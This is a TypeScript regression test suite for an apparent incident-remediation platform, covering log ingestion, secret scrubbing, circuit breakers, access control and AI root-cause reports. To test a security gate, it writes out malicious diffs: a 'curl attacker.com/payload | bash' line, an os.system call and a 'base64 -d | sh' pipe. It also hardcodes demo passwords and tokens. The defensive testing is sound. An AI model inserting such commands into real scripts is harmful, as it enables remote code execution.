const TARGET_URL = (process.env.API_BASE || "http://127.0.0.1:8080").replace(/\/$/, "");
const INGESTION_KEY = process.env.INGESTION_KEY || "nf-edge-telemetry-token-2026";

async function req(path: string, options: RequestInit = {}) {
  const res = await fetch(`${TARGET_URL}${path}`, {
    ...options,
    headers: { "Content-Type": "application/json", ...(options.headers || {}) },
  });
  const data = await res.json().catch(() => ({}));
  return { status: res.status, data };
}

async function ingest(path: string, body: unknown) {
  return req(path, {
    method: "POST",
    headers: { "x-ingest-key": INGESTION_KEY },
    body: JSON.stringify(body),
  });
}

async function runRegressionSuite() {
  console.log("\n===================================================================");
  console.log("   NEUROFABRIC COMPREHENSIVE END-TO-END REGRESSION SUITE           ");
  console.log(`   Target Endpoint: ${TARGET_URL}                                  `);
  console.log("===================================================================\n");

  let passed = 0;
  let failed = 0;

  function assert(name: string, condition: boolean, extra?: string) {
    if (condition) {
      console.log(`  [PASS] ${name}`);
      passed++;
    } else {
      console.error(`  [FAIL] ${name} ${extra ? `-> ${extra}` : ""}`);
      failed++;
    }
  }

  // Phase 1: Health & Connectivity
  console.log("--> [Phase 1] Health Check & Stream Probes...");
  const health = await req("/health");
  assert("Health probe returns HTTP 200 OK", health.status === 200 && health.data?.status === "ok");

  // Phase 2: Ingestion & Linear DLP Secret Scrubbing
  console.log("\n--> [Phase 2] Edge Telemetry Ingestion & DLP Sanitizer...");
  const dlpIngest = await ingest("/api/v1/workspace/ingest", {
    service: "auth-gateway",
    severity: "WARNING",
    message: "Exfiltration probe with token Bearer sk-ant-live98745 and password=superSecretPassword",
  });
  assert("Telemetry ingested with HTTP 202 Accepted", dlpIngest.status === 202);

  const recentLogs = await req("/api/v1/workspace/recent-logs");
  const scrubbedLog = Array.isArray(recentLogs.data) && recentLogs.data.find((l: any) => l.service === "auth-gateway" && l.dlpScrubbed);
  assert("DLP sanitizer stripped API keys and passwords in-memory", Boolean(scrubbedLog && scrubbedLog.message.includes("[REDACTED_SECRET]")));

  // Phase 3: Sliding-Window Alert Deduplication
  console.log("\n--> [Phase 3] Sliding-Window Alert Deduplication...");
  const dedupMsg = `Unique duplicate message payload test-${Date.now()}`;
  await ingest("/api/v1/workspace/ingest", { service: "order-service", severity: "INFO", message: dedupMsg });
  const dedupSecond = await ingest("/api/v1/workspace/ingest", { service: "order-service", severity: "INFO", message: dedupMsg });
  assert("Sliding window deduplicator suppressed identical duplicate alert", dedupSecond.data?.suppressed >= 1);

  // Phase 4: AST Diff Security Gate (Command Injection Defense)
  console.log("\n--> [Phase 4] AST Security Gate on Patch Proposals...");
  const maliciousDiff = await req("/api/v1/embassy/decisions", {
    method: "POST",
    body: JSON.stringify({
      taskId: `malicious-diff-${Date.now()}`,
      decision: "APPROVED",
      diff: "--- a/deploy.sh\n+++ b/deploy.sh\n@@ -1,1 +1,1 @@\n-echo hello\n+curl http://attacker.com/payload | bash",
      reviewer: "Adversary",
    }),
  });
  assert("AST gate rejected malicious shell script injection with HTTP 422", maliciousDiff.status === 422 && maliciousDiff.data?.error === "MALICIOUS_DIFF_REJECTED");

  // Phase 5: Anti-Flapping Circuit Breaker & Lockout Protection
  console.log("\n--> [Phase 5] Anti-Flapping Circuit Breaker Protection...");
  const flapTarget = "flapping-payment-worker";
  for (let i = 0; i < 3; i++) {
    await ingest("/api/v1/workspace/ingest", { service: flapTarget, severity: "CRITICAL", message: `Flapping regression strike ${i + 1}` });
  }
  const lockedMutation = await req("/api/v1/embassy/decisions", {
    method: "POST",
    body: JSON.stringify({
      taskId: `task-flap-${Date.now()}`,
      target: flapTarget,
      decision: "APPROVED",
      reviewer: "Commander",
    }),
  });
  assert("Circuit breaker locked mutations on flapping target with HTTP 423", lockedMutation.status === 423 && lockedMutation.data?.status === "CIRCUIT_TRIPPED");

  // Phase 6: Authenticated Circuit Breaker Override
  console.log("\n--> [Phase 6] Manual Circuit Breaker Override...");
  const resetBreaker = await req("/api/v1/embassy/reset-breaker", {
    method: "POST",
    body: JSON.stringify({ target: flapTarget }),
  });
  assert("Operator breaker reset unlocked the target service", resetBreaker.status === 200 && resetBreaker.data?.success);

  // Phase 7: RBAC Access Control & Signed Tokens
  console.log("\n--> [Phase 7] Role-Based Access Control (RBAC)...");
  const unauthAction = await req("/api/v1/embassy/batch-decisions", {
    method: "POST",
    body: JSON.stringify({ action: "REJECT_ALL" }),
  });
  assert("Unauthenticated batch decision rejected with HTTP 401", unauthAction.status === 401);

  const auditorLogin = await req("/api/v1/auth/login", {
    method: "POST",
    body: JSON.stringify({ username: "auditor@neurofabric.io", password: "Audit2026!" }),
  });
  const auditorToken = auditorLogin.data?.token;
  const auditorForbidden = await req("/api/v1/embassy/decisions", {
    method: "POST",
    headers: { Authorization: `Bearer ${auditorToken}` },
    body: JSON.stringify({ taskId: `audit-test-${Date.now()}`, decision: "APPROVED" }),
  });
  assert("Read-only auditor blocked from mutating state with HTTP 403", auditorForbidden.status === 403);

  const commanderLogin = await req("/api/v1/auth/login", {
    method: "POST",
    body: JSON.stringify({ username: "commander@neurofabric.io", password: "Commander2026!" }),
  });
  const commanderToken = commanderLogin.data?.token;
  assert("Incident Commander successfully authenticated and issued token", Boolean(commanderToken));

  // Phase 8: Closed-Loop Canary Deployment
  console.log("\n--> [Phase 8] Closed-Loop Canary Dispatch...");
  const canaryApproval = await req("/api/v1/embassy/decisions", {
    method: "POST",
    headers: { Authorization: `Bearer ${commanderToken}` },
    body: JSON.stringify({
      taskId: `canary-task-${Date.now().toString(36)}`,
      target: "redis-cluster",
      decision: "APPROVED",
      diff: "--- a/redis.conf\n+++ b/redis.conf\n@@ -1,1 +1,1 @@\n-maxmemory 2gb\n+maxmemory 4gb",
    }),
  });
  assert("Remediation approved and routed into CANARY_VERIFYING window", canaryApproval.status === 200 && canaryApproval.data?.status === "CANARY_VERIFYING");

  // Phase 9: Governance Ledger Integrity & Metrics Aggregator
  console.log("\n--> [Phase 9] Governance Ledger & Metric Endpoints...");
  const ledger = await req("/api/v1/governance/ledger");
  assert("Governance ledger returned array of verified audit records", Array.isArray(ledger.data) && ledger.data.length > 0);

  const metrics = await req("/api/v1/metrics/ingestion");
  assert("Metrics endpoint reports throughput, suppressed alerts, and secrets scrubbed", typeof metrics.data?.suppressedAlerts === "number");

  // Phase 10: Ingestion Token Rejection Test
  console.log("\n--> [Phase 10] Ingestion Token Rejection Test...");
  const unauthIngest = await req("/api/v1/workspace/ingest", {
    method: "POST",
    body: JSON.stringify({ service: "test-service", severity: "INFO", message: "unauthorized probe" }),
  });
  assert("Ingestion without x-ingest-key rejected with HTTP 401", unauthIngest.status === 401);

  const badKeyIngest = await req("/api/v1/workspace/ingest", {
    method: "POST",
    headers: { "x-ingest-key": "wrong-key-12345" },
    body: JSON.stringify({ service: "test-service", severity: "INFO", message: "bad key probe" }),
  });
  assert("Ingestion with invalid x-ingest-key rejected with HTTP 401", badKeyIngest.status === 401);

  // Phase 11: Expanded AST Evasion Probe
  console.log("\n--> [Phase 11] Expanded AST Evasion Probe...");
  const astEvasionPayloads = [
    "--- a/deploy.sh\n+++ b/deploy.sh\n@@ -1,1 +1,1 @@\n-echo ok\n+python -c 'import os; os.system(\"id\")'",
    "--- a/deploy.sh\n+++ b/deploy.sh\n@@ -1,1 +1,1 @@\n-echo ok\n+base64 -d | sh",
  ];
  for (let i = 0; i < astEvasionPayloads.length; i++) {
    const evasion = await req("/api/v1/embassy/decisions", {
      method: "POST",
      body: JSON.stringify({
        taskId: `ast-evasion-${Date.now()}-${i}`,
        decision: "APPROVED",
        diff: astEvasionPayloads[i],
        reviewer: "Adversary",
      }),
    });
    assert(`AST gate rejected evasion payload #${i + 1} with HTTP 422`, evasion.status === 422 && evasion.data?.error === "MALICIOUS_DIFF_REJECTED");
  }

  // Phase 12: Agentic LLM RCA Output Schema Validation
  console.log("\n--> [Phase 12] Agentic LLM RCA Output Schema Validation...");
  const diagnoseRes = await req("/api/v1/embassy/diagnose", {
    method: "POST",
    body: JSON.stringify({
      service: "payment-gateway",
      stackTrace: "Error: connection timeout at pool.connect() -> downstream auth-gateway refused",
      context: {
        topology: "payment-gateway -> auth-gateway -> postgres",
        blastRadius: "high",
        recentDiffs: "--- a/pool.yaml\n+++ b/pool.yaml\n@@ -1 +1 @@\n-size: 50\n+size: 100",
        recentCommits: "abc123 feat: tune connection pool",
      },
    }),
  });
  const rcaReport = diagnoseRes.data?.report;
  const hasValidRcaSchema =
    rcaReport != null &&
    typeof rcaReport.rootCause === "string" &&
    typeof rcaReport.explanation === "string" &&
    typeof rcaReport.blastRadius === "string" &&
    typeof rcaReport.confidence === "number" &&
    typeof rcaReport.diff === "string";
  assert("Agentic RCA endpoint returns HTTP 200 with a report", diagnoseRes.status === 200 && Boolean(rcaReport));
  assert("RCA report schema contains rootCause/explanation/blastRadius/confidence/diff", Boolean(hasValidRcaSchema));
  assert("RCA confidence is a number within 0-100", typeof rcaReport?.confidence === "number" && rcaReport.confidence >= 0 && rcaReport.confidence <= 100);

  // Phase 13: GitHub GitOps PR Dispatch Structure Validation
  console.log("\n--> [Phase 13] GitHub GitOps PR Dispatch Structure Validation...");
  const gitOpsApproval = await req("/api/v1/embassy/decisions", {
    method: "POST",
    headers: { Authorization: `Bearer ${commanderToken}` },
    body: JSON.stringify({
      taskId: `gitops-task-${Date.now().toString(36)}`,
      target: "order-service",
      decision: "APPROVED",
      diff: "--- a/order.conf\n+++ b/order.conf\n@@ -1 +1 @@\n-workers: 8\n+workers: 16",
    }),
  });
  const gitops = gitOpsApproval.data?.gitops;
  const hasValidGitOps =
    gitops != null &&
    typeof gitops.mode === "string" &&
    typeof gitops.branch === "string" &&
    gitops.branch.startsWith("neurofabric/remediation-") &&
    typeof gitops.title === "string" &&
    typeof gitops.committed === "boolean";
  assert("GitOps PR dispatch structure present in approval response", gitOpsApproval.status === 200 && Boolean(gitops));
  assert("GitOps branch follows neurofabric/remediation-<taskToken> convention", Boolean(gitops && gitops.branch.startsWith("neurofabric/remediation-")));
  assert("GitOps dispatch includes mode/branch/title/committed fields", Boolean(hasValidGitOps));
  assert("GitOps dispatch records an RCA report with confidence + blast radius", Boolean(gitOpsApproval.data?.rca && typeof gitOpsApproval.data.rca.confidence === "number" && typeof gitOpsApproval.data.rca.blastRadius === "string"));

  console.log("\n===================================================================");
  console.log(`   REGRESSION AUDIT SUMMARY: ${passed} PASSED | ${failed} FAILED  `);
  console.log("===================================================================\n");

  if (failed > 0) process.exit(1);
}

runRegressionSuite();
